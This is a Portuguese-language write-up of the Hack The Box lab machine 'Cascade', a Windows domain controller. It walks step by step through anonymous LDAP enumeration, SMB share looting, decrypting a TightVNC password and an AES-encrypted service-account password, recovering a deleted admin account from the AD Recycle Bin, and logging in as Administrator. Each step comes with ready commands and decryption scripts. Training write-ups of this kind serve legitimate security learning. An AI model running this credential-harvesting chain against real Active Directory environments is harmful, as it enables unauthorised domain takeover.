# Write-up: Cascade - Hack The Box

> Data: 27 de Maio de 2026  
> Target IP: `10.129.4.145`

![STATUS](https://img.shields.io/badge/STATUS-COMPROMETIMENTO%20TOTAL-brightgreen?style=flat-square) ![DIFFICULTY](https://img.shields.io/badge/DIFFICULTY-MEDIUM-orange?style=flat-square) ![OS](https://img.shields.io/badge/OS-Windows-blue?style=flat-square) ![TECHNIQUE](https://img.shields.io/badge/TECHNIQUE-AD%20Recycle%20Bin-red?style=flat-square) ![PRIVESC](https://img.shields.io/badge/PRIVESC-TempAdmin%20Recovery-purple?style=flat-square)

Cascade é um Domain Controller Windows Server 2008 R2 que exige uma cadeia longa de enumeração e exploração, LDAP anônimo, descriptografia VNC, engenharia reversa de binário .NET e recuperação de objetos deletados do AD Recycle Bin. Uma máquina que ensina muito sobre como credenciais ficam espalhadas por um ambiente corporativo real.




## Fase 1 - Reconhecimento

Como de costume, **atualizar** o /etc/hosts e executar o **nmap** no alvo.

```bash
echo "10.129.4.145 cascade.htb" | sudo tee -a /etc/hosts
nmap -sV -sC -T4 -Pn -oN scan.txt 10.129.4.145
```

**Resultado:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-26 23:06 EDT
Nmap scan report for cascade.htb (10.129.4.145)
Host is up (0.18s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-27 03:06:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-27T03:07:43
|_  start_date: 2026-05-27T03:02:30
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.99 seconds
```

Domain Controller clássico. Domínio `cascade.local`, hostname `CASC-DC1`.
```bash
Porta  Serviço  Relevância
389/3268  LDAP  Enumeração anônima ← comecei aqui!
445  SMB  Shares
598  5WinRM  Acesso remoto quando tivermos creds
```

---

## Fase 2 - Enumeração LDAP Anônima

O diferencial do Cascade começa aqui é o servidor LDAP aceita consultas anônimas e expõe atributos customizados nos objetos de usuário.

```bash
ldapsearch -x -H ldap://10.129.4.145 -b "DC=cascade,DC=local" "(objectClass=user)" sAMAccountName description cascadeLegacyPwd 2>/dev/null | grep -E "sAMAccountName|description|cascadeLegacyPwd|dn:"

```

**Resultado crítico:**
```
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
sAMAccountName: r.thompson
cascadeLegacyPwd: clk0bjVldmE=
```

O atributo `cascadeLegacyPwd` não é padrão do AD, foi criado pelo administrador para armazenar senhas legadas. O valor é Base64.

Vamos decodificar:

```bash
echo "clk0bjVldmE=" | base64 -d
# rY4n5eva
```

**Credenciais:** `r.thompson : rY4n5eva`

---

## Fase 3 - Enumeração SMB

r.thompson não tem acesso WinRM, mas tem acesso de leitura ao share **Data**:

```bash
crackmapexec smb 10.129.4.145 -u r.thompson -p rY4n5eva --shares
# Data → READ

smbclient //10.129.4.145/Data -U "cascade.local/r.thompson%rY4n5eva"
smb: \> recurse ON; prompt OFF; mget *
```

**Arquivos baixados:**
```
IT/Email Archives/Meeting_Notes_June_2018.html
IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log
IT/Temp/s.smith/VNC Install.reg
```

**Email - informação crítica:**
> "Username is TempAdmin (password is the same as the normal admin account password)"
> "This account will be deleted at the end of 2018"

**Log - ArkSvc gerencia o AD Recycle Bin:**
```
Running as user CASCADE\ArkSvc
Moving object to AD recycle bin CN=TempAdmin...
```

**VNC Install.reg - senha do s.smith em hex:**
```
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

---

## Fase 4 - Descriptografia VNC

VNC (TightVNC) armazena senhas usando DES com uma chave fixa e bits invertidos por byte:

```python
from Crypto.Cipher import DES

def reverse_bits(b):
    return int('{:08b}'.format(b)[::-1], 2)

key = bytes([reverse_bits(b) for b in [23,82,107,6,35,78,88,7]])
enc = bytes.fromhex('6bcf2a4b6e5aca0f')
d = DES.new(key, DES.MODE_ECB)
print(d.decrypt(enc))
# sT333ve2
```

**Credenciais:** `s.smith : sT333ve2`

---

## Fase 5 - Acesso WinRM como s.smith

```bash
evil-winrm -i 10.129.4.145 -u s.smith -p sT333ve2
```

s.smith está no grupo **Audit Share** que tem acesso ao share `Audit$` que r.thompson não conseguia acessar.

```bash
smbclient //10.129.4.145/Audit$ -U "cascade.local/s.smith%sT333ve2" \
  -c "recurse ON; prompt OFF; mget *"
```

**Conteúdo do Audit$:**
```
CascAudit.exe      ← executável .NET
CascCrypto.dll     ← biblioteca de criptografia
DB/Audit.db        ← banco SQLite
RunAudit.bat       ← script de execução
```

---

## Fase 6 - Engenharia Reversa .NET

O banco SQLite contém a senha do `arksvc` criptografada:

```bash
sqlite3 DB/Audit.db "SELECT * FROM Ldap;"
# 1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

Decompilar o `CascAudit.exe` com ilspycmd revelou a chave hardcoded:

```csharp
password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
```

E o `CascCrypto.dll` revelou o algoritmo completo:

```csharp
public const string DefaultIV = "1tdyjCbY1Ix49842";
// AES-128 CBC
```

Descriptografando:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

key = b'c4scadek3y654321'
iv  = b'1tdyjCbY1Ix49842'
enc = base64.b64decode('BQO5l5Kj9MdErXx6Q6AGOw==')
cipher = AES.new(key, AES.MODE_CBC, iv)
print(unpad(cipher.decrypt(enc), 16).decode())
# w3lc0meFr31nd
```

**Credenciais:** `arksvc : w3lc0meFr31nd`

---

## Fase 7 - AD Recycle Bin → Administrator

arksvc está no grupo **AD Recycle Bin** e pode recuperar objetos deletados do AD.

```powershell
evil-winrm -i 10.129.4.145 -u arksvc -p w3lc0meFr31nd

Get-ADObject -SearchBase "CN=Deleted Objects,DC=cascade,DC=local" `
  -Filter {ObjectClass -eq "user"} `
  -IncludeDeletedObjects -Properties * | `
  Select-Object sAMAccountName, cascadeLegacyPwd
```

**Resultado:**
```
TempAdmin | YmFDVDNyMWFOMDBkbGVz
```

```bash
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
# baCT3r1aN00dles
```

O email dizia que a senha do TempAdmin era igual à do Administrator:

```bash
evil-winrm -i 10.129.4.145 -u Administrator -p baCT3r1aN00dles
type C:\Users\Administrator\Desktop\root.txt
```

---

## 🚩 Flags

| Flag | Status |
|------|--------|
| User | ✅ Obtida via WinRM como s.smith |
| Root | ✅ Obtida via Administrator |

---


## 🛠️ Ferramentas Utilizadas

| Ferramenta | Uso |
|------------|-----|
| `nmap` | Reconhecimento de portas |
| `ldapsearch` | Enumeração LDAP anônima |
| `crackmapexec` | Validação de credenciais e shares SMB |
| `smbclient` | Acesso e download de shares |
| `evil-winrm` | Acesso remoto WinRM |
| `sqlite3` | Análise do banco de dados |
| `ilspycmd` | Decompilação de binários .NET |
| `pycryptodome` | Descriptografia AES/DES |
| `Get-ADObject` | Recuperação de objetos do AD Recycle Bin |

---


<div align="center">
  <p>Escrito por:</p>
  <a href="https://www.linkedin.com/in/ralph-sonato-77086b16b/"><img src="https://img.shields.io/badge/LinkedIn-Ralph_Sonato-0e76a8?style=for-the-badge&logo=linkedin&logoColor=white"></a>
  <p><i>Analista de Cibersegurança</i></p>
</div>
